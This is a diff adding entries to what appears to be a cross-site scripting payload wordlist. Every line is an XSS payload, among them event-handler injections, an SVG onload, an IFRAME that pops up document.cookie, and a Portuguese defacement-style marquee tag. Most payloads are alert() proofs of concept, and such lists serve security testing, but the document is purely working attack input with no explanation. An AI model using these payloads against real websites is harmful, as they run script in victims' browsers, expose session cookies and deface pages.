@@ -19,14 +19,19 @@
 "autofocus/onfocus=alert(1)//
 '-alert(1)-'
 '-alert(1)//
+" onMouseOver="alert(1);
 \'-alert(1)//
 </script><svg onload=alert(1)>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img> 
 <x contenteditable onblur=alert(1)>lose focus! 
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
 <x onclick=alert(1)>click this! 
 <x oncopy=alert(1)>copy this! 
 <x oncontextmenu=alert(1)>right click this! 
+"><marquee>O seu nome ESTEVE AQUI<marquee>
 <x oncut=alert(1)>copy this! 
 <x ondblclick=alert(1)>double click this! 
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 <x ondrag=alert(1)>drag this! 
 <x contenteditable onfocus=alert(1)>focus this! 
 <x contenteditable oninput=alert(1)>input here! 
